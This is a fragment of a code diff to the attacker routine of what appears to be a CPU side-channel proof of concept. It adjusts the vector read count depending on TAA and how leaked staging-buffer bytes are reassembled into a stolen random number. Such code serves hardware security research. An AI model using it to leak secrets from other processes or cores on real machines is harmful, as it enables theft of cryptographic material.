@@ -35,10 +35,10 @@ void attacker(int cpu, int reps, void* mem){
         :::"eax");
         while (!staging_buffer_byte_changed(mem, 32, byte_32)){}
         uint64_t random_number = 0;
-        vector_read(mem, 20000, staging_buffer, 32, 40, 0);
+        vector_read(mem, 3800 * (1 + (5*!uses_taa())), staging_buffer, 32, 40, 0);
         for(int i = 0; i < 8; i++) {
             random_number = random_number << 8;
-            random_number += staging_buffer[32 + (8 - i - 1)];
+            random_number |= (uint8_t) staging_buffer[32 | (7 - i)];
         }
         printf("[\e[31mATTACKER\e[39m] Recovered Random Number \e[31m0x%16lx\e[39m\n", random_number);
         fflush(stdout);
